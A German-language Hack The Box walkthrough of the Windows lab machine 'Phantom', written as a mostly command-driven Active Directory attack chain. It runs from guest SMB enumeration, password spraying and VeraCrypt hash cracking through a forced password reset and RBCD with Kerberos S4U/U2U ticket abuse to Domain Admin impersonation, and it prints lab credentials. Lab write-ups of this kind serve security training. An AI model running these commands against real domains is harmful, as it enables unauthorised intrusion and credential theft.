# Hack The Box - Phantom (Deutsches Walkthrough)

## Synopsis

Phantom ist eine Windows-Maschine mittlerer Schwierigkeit mit Fokus auf Active-Directory-Exploitation. Die initiale Enumeration offenbart ein öffentlich erreichbares SMB-Share mit einer E-Mail-Datei, die einen Base64-kodierten PDF-Anhang enthält, aus dem ein Domänenpasswort geleakt wird. Nach User Enumeration und Password Spraying werden gültige Credentials für `ibryant` gefunden.

Weitere Enumeration von Shares führt zu einem VeraCrypt-Container, dessen Inhalt nach erfolgreichem Cracking ein VyOS-Router-Backup offenlegt. Darin befinden sich Credentials, über die Zugriff auf `lstanley` bzw. später `svc_sspr` möglich wird. Durch Missbrauch von Resource-Based Constrained Delegation (RBCD) sowie S4U2Self / S4U2Proxy Kerberos Delegation wird schließlich ein Domain Admin impersoniert und vollständige Domänenkompromittierung erreicht.

## Enumeration

### Nmap

```text
nmap -vv -T4 -sV -sC 10.129.234.63
```

**Der Output zeigt, dass das Ziel ein Domain Controller ist:**
- Domain: `phantom.vl`
- Hostname: `DC`

**In Hosts eintragen:**
```text
echo '10.129.234.63 phantom.vl DC.phantom.vl' | sudo tee -a /etc/hosts
```

**Interessante Dienste:**
- Kerberos (88)
- LDAP (389 / 3268)
- SMB (445)
- WinRM (5985)
- RDP (3389)

Das deutet früh auf einen AD-Angriffsweg hin.

## SMB Enumeration

**Zunächst Gastzugriff prüfen:**
```text
nxc smb phantom.vl -u 'guest' -p '' --shares
```

**Interessant:**
- `Public` READ
- `Departments` Share

**RID Enumeration:**
```text
nxc smb phantom.vl -u 'guest' -p '' --rid-brute > tmp
cat tmp | cut -d '\\' -f2 | awk '{print $1}' | tee users.txt
```

**Password Spray mit `Username=Password`:**
```text
nxc smb phantom.vl -u users.txt -p users.txt --continue-on-success --no-bruteforce
```

Keine brauchbaren Treffer.

### Public Share untersuchen

```text
smbclient.py PHANTOM/guest@phantom.vl -no-pass
```

**Im Public Share liegt:**
- `tech_support_email.eml`

Die E-Mail enthält einen Base64-kodierten PDF-Anhang.

**Dekodieren:**
```text
echo "<BASE64>" | base64 -d > welcome_template.pdf
```

**Im PDF:**
- `Password: Ph4nt0m@5t4rt!`

**Neuer Password Spray:**
```text
nxc smb phantom.vl -u users.txt -p 'Ph4nt0m@5t4rt!' --continue-on-success
```

**Treffer:**
- `phantom.vl\ibryant`

## Departments Share / VeraCrypt Container

**Mit `ibryant` weiter:**
```text
nxc smb phantom.vl -u ibryant -p 'Ph4nt0m@5t4rt!' -M spider_plus
```

**Navigation:**
- `Departments`
- `IT`
- `Backup`
- `IT_BACKUP_201123.hc`

**Download:**
```text
get IT_BACKUP_201123.hc
```

**Hash extrahieren:**
```text
dd if=./IT_BACKUP_201123.hc of=./hash bs=512 count=1
```

**Wordlist bauen:**
```text
crunch 12 12 -t 'Phantom202%^' -o wordlist.txt
```

**Cracken:**
```text
hashcat -m 13722 -a 0 hash wordlist.txt
```

**Passwort:**
- `Phantom2023!`

### VeraCrypt Container

Container mounten und Inhalte prüfen.

**Interessante Datei:**
- `vyos_backup.tar.gz`

**Extrahieren:**
```text
mkdir /tmp/vyos
tar -xvzf vyos_backup.tar.gz -C /tmp/vyos
```

**Interessante Konfig:**
- `/config/config.boot`

**Credential Leak:**
- `username lstanley`
- `password gB6XTcqVP5MlP7Rc`

## Credential Reuse

**Password Spray erneut:**
```text
nxc smb phantom.vl -u users.txt -p gB6XTcqVP5MlP7Rc --continue-on-success
```

**Treffer:**
- `svc_sspr`

**WinRM prüfen:**
```text
nxc winrm phantom.vl -u svc_sspr -p gB6XTcqVP5MlP7Rc
```

**User-Flag:**
```text
C:\Users\svc_sspr\Desktop\user.txt
```

## Privilege Escalation

### BloodHound

**Collection:**
```text
nxc ldap 10.129.234.63 -u 'svc_sspr' -p 'gB6XTcqVP5MlP7Rc' --bloodhound --dns-server 10.129.234.63 -c All
```

**BloodHound zeigt:**
- `svc_sspr` besitzt `ForceChangePassword` auf `crose`, `wsilva`, `rnichols`
- besonders wichtig: `wsilva -> ICT Security -> AddAllowedToAct -> DC.phantom.vl`

RBCD-Angriffsweg identifiziert.

**Passwort setzen:**
```text
net rpc password 'wsilva' 'P@ssw0rd' -U "DC.phantom.vl"/"svc_sspr"%"gB6XTcqVP5MlP7Rc" -S "DC.phantom.vl"
```

**Validieren:**
```text
nxc smb phantom.vl -u wsilva -p 'P@ssw0rd'
```

**MachineAccountQuota prüfen:**
```text
nxc ldap phantom.vl -u svc_sspr -p 'gB6XTcqVP5MlP7Rc' -M maq
```

**Ergebnis:**
- `MachineAccountQuota: 0`

Standard-RBCD mit neuem Computeraccount fällt damit aus.

### RBCD mit Non-Machine Account

**Zeit syncen:**
```text
timedatectl set-ntp off
ntpdate phantom.vl
```

**Delegation setzen:**
```text
rbcd.py -delegate-from 'wsilva' -delegate-to 'DC$' -dc-ip '10.129.234.63' -action 'write' 'phantom.vl'/'wsilva':'P@ssw0rd'
```

**Erfolg:**
- `Delegation rights modified successfully`

### Kerberos Ticket Abuse

**NTLM erzeugen:**
```text
NTLM=$(echo -n 'P@ssw0rd' | iconv -f UTF-8 -t UTF-16LE | openssl dgst -md4 | awk '{print $2}')
```

**TGT holen:**
```text
getTGT.py -hashes :$NTLM 'phantom.vl'/'wsilva'
```

**ccache exportieren:**
```text
export KRB5CCNAME=wsilva.ccache
```

**Session Key extrahieren:**
```text
describeTicket.py wsilva.ccache | grep 'Ticket Session Key'
```

**Beispiel:**
- `4486d4a49d04b1b3fb5e5f0a038cf58a`

**NTLM durch Session Key ersetzen:**
```text
smbpasswd.py -newhashes :4486d4a49d04b1b3fb5e5f0a038cf58a 'phantom.vl'/'wsilva':'P@ssw0rd'@'DC.phantom.vl'
```

**Administrator impersonieren:**
```text
getST.py -k -no-pass -u2u -impersonate Administrator -spn cifs/DC.phantom.vl
```

Danach erfolgt der Zugriff mit delegiertem Ticket auf den Domain Controller.

## Angriffskette Kurzüberblick

- Anonymous SMB
- Mail-Anhang mit Passwort-Leak
- Password Spraying
- Zugriff als `ibryant`
- VeraCrypt Container
- VyOS Backup Credential Leak
- Zugriff als `svc_sspr`
- BloodHound / RBCD Path
- Kerberos Ticket Abuse
- Domain Admin
